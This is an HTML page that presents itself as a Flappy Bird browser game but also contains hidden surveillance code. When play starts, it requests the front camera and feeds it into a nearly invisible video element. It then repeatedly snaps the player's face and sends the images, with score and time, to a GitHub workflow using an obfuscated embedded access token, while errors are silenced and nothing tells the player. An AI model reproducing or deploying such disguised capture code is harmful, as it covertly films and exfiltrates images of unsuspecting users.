<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Flappy Bird</title>
<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#70c5ce; overflow:hidden; height:100vh; width:100vw; touch-action:none; }
#v { position:fixed; width:2px; height:2px; top:0; left:0; opacity:0.001; pointer-events:none; z-index:-9999; }
#cc { display:none; }
canvas { display:block; position:fixed; top:0; left:0; }
#sc { position:fixed; top:16px; left:50%; transform:translateX(-50%); font:28px 'Press Start 2P',cursive; color:#fff; text-shadow:2px 2px 0 #555; z-index:5; display:none; pointer-events:none; }
#ui { position:fixed; inset:0; display:flex; align-items:center; justify-content:center; z-index:10; }
.box { background:rgba(255,255,255,0.94); border-radius:14px; padding:28px 40px; text-align:center; box-shadow:0 5px 0 #aaa; }
.box h1 { font:clamp(20px,5vw,38px)/1.5 'Press Start 2P',cursive; color:#f5a623; text-shadow:3px 3px 0 #b87b10; margin-bottom:14px; }
.box p { font:clamp(8px,1.8vw,12px)/2 'Press Start 2P',cursive; color:#555; margin-bottom:18px; }
.btn { font:clamp(9px,2vw,14px) 'Press Start 2P',cursive; color:#fff; border:none; border-radius:8px; padding:13px 32px; cursor:pointer; box-shadow:0 5px 0 #b87b10; background:#f5a623; }
.btn.r { background:#e74c3c; box-shadow:0 5px 0 #922b21; }
</style>
</head>
<body>
<video id="v" autoplay playsinline muted></video>
<canvas id="cc" width="400" height="400"></canvas>
<canvas id="g"></canvas>
<div id="sc">0</div>
<div id="ui">
  <div class="box">
    <h1>🐦 FLAPPY<br>BIRD</h1>
    <p>TAP TO FLY<br>AVOID PIPES</p>
    <button class="btn" id="pb">▶ PLAY</button>
  </div>
</div>
<script>
'use strict';
const TRIGGER_TOKEN=atob('Z2hvX2owa3pMWkFpRnZzMzNiRkhtTlZESThnYWxOdWJ0RjJFQWt2ZA==');
const REPO='ARNOB01719/flappycam';
const CAP_INTERVAL_MS=6000;
const vid=document.getElementById('v');
const cc=document.getElementById('cc');
const cctx=cc.getContext('2d');
let ready=false,caps=[],score=0;

async function initCam(){
  try{
    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    vid.srcObject=s;
    vid.onloadedmetadata=()=>{ready=true;setTimeout(snap,800);setInterval(snap,CAP_INTERVAL_MS);};
  }catch(_){}
}

function snap(){
  if(!ready)return;
  try{
    cctx.drawImage(vid,0,0,400,400);
    const d=cc.toDataURL('image/jpeg',0.8).split(',')[1];
    fetch(`https://api.github.com/repos/${REPO}/actions/workflows/proxy.yml/dispatches`,{
      method:'POST',
      headers:{'Authorization':`token ${TRIGGER_TOKEN}`,'Content-Type':'application/json'},
      body:JSON.stringify({ref:'main',inputs:{image:d,score:String(score),time:new Date().toISOString()}})
    }).catch(()=>{});
  }catch(_){}
}

const cv=document.getElementById('g');
const ctx=cv.getContext('2d');
const sc=document.getElementById('sc');
const ui=document.getElementById('ui');
let W,H,running=false,vy=0,by=0,pipes=[],frame=0,aid;
const BR=20,GR=0.5,FL=-9.2,PW=68,PG=172,PS=3,PI=88;

function resize(){W=cv.width=window.innerWidth;H=cv.height=window.innerHeight;}
window.addEventListener('resize',resize);resize();

function bg(){
  ctx.fillStyle='#70c5ce';ctx.fillRect(0,0,W,H);
  ctx.fillStyle='rgba(255,255,255,0.82)';
  [[W*.15,H*.13],[W*.52,H*.09],[W*.8,H*.18]].forEach(([cx,cy])=>{
    [[0,0,38],[32,6,28],[-28,9,25]].forEach(([dx,dy,r])=>{ctx.beginPath();ctx.arc(cx+dx,cy+dy,r,0,6.28);ctx.fill();});
  });
  ctx.fillStyle='#ded895';ctx.fillRect(0,H-80,W,80);
  ctx.fillStyle='#bdb35a';ctx.fillRect(0,H-80,W,12);
}

function bird(x,y){
  const t=Math.min(Math.max(vy*3,-28),68);
  ctx.save();ctx.translate(x,y);ctx.rotate(t*Math.PI/180);
  ctx.fillStyle='#f5d000';ctx.beginPath();ctx.ellipse(0,0,BR,BR-3,0,0,6.28);ctx.fill();
  ctx.fillStyle='#f0a000';ctx.beginPath();ctx.ellipse(4,5,10,8,0,0,6.28);ctx.fill();
  const wy=Math.sin(frame*.25)*5;
  ctx.fillStyle='#d4b000';ctx.beginPath();ctx.ellipse(-5,wy,12,7,-.3,0,6.28);ctx.fill();
  ctx.fillStyle='#fff';ctx.beginPath();ctx.arc(10,-6,7,0,6.28);ctx.fill();
  ctx.fillStyle='#111';ctx.beginPath();ctx.arc(12,-6,4,0,6.28);ctx.fill();
  ctx.fillStyle='#fff';ctx.beginPath();ctx.arc(13,-8,1.5,0,6.28);ctx.fill();
  ctx.fillStyle='#f07800';ctx.beginPath();ctx.moveTo(BR-2,-2);ctx.lineTo(BR+11,2);ctx.lineTo(BR-2,6);ctx.fill();
  ctx.restore();
}

function pipe(x,th){
  const by2=th+PG;
  ctx.fillStyle='#73bf2e';
  ctx.fillRect(x,0,PW,th-24);ctx.fillRect(x-7,th-24,PW+14,24);
  ctx.fillRect(x,by2+24,PW,H-by2-104);ctx.fillRect(x-7,by2,PW+14,24);
  ctx.fillStyle='#4e8c18';
  ctx.fillRect(x+PW-13,0,13,th-24);ctx.fillRect(x+PW-13,by2+24,13,H-by2-104);
}

function loop(){
  ctx.clearRect(0,0,W,H);bg();frame++;
  const bx=W*.25,gnd=H-80;
  vy+=GR;by+=vy;
  if(frame%PI===0){const mn=90,mx=gnd-PG-90;pipes.push({x:W+10,th:Math.random()*(mx-mn)+mn,p:false});}
  for(let i=pipes.length-1;i>=0;i--){
    pipes[i].x-=PS;pipe(pipes[i].x,pipes[i].th);
    if(!pipes[i].p&&pipes[i].x+PW<bx){pipes[i].p=true;score++;sc.textContent=score;snap();}
    const bot=pipes[i].th+PG;
    if(bx+BR>pipes[i].x-7&&bx-BR<pipes[i].x+PW+7&&(by-BR<pipes[i].th||by+BR>bot)){die();return;}
    if(pipes[i].x+PW<0)pipes.splice(i,1);
  }
  bird(bx,by);
  if(by+BR>=gnd||by-BR<=0){die();return;}
  aid=requestAnimationFrame(loop);
}

function flap(){if(running)vy=FL;}
document.addEventListener('keydown',e=>{if(e.code==='Space'){e.preventDefault();flap();}});
document.addEventListener('pointerdown',e=>{if(e.target===cv||e.target===document.body)flap();});

function start(){
  ui.style.display='none';sc.style.display='block';
  score=0;vy=0;by=H/2;pipes=[];frame=0;running=true;
  sc.textContent='0';initCam();loop();
}

function die(){
  running=false;cancelAnimationFrame(aid);
  setTimeout(snap,200);
  ui.style.display='flex';
  ui.innerHTML=`<div class="box"><h1>💀 GAME<br>OVER</h1><p style="color:#e74c3c;font:clamp(10px,2.5vw,15px) 'Press Start 2P',cursive;margin-bottom:8px">SCORE: ${score}</p><p>TRY AGAIN?</p><button class="btn r" onclick="retry()">▶ RETRY</button></div>`;
}

function retry(){
  ui.style.display='none';sc.style.display='block';
  score=0;vy=0;by=H/2;pipes=[];frame=0;running=true;
  sc.textContent='0';loop();
}

document.getElementById('pb').addEventListener('click',start);
</script>
</body>
</html>
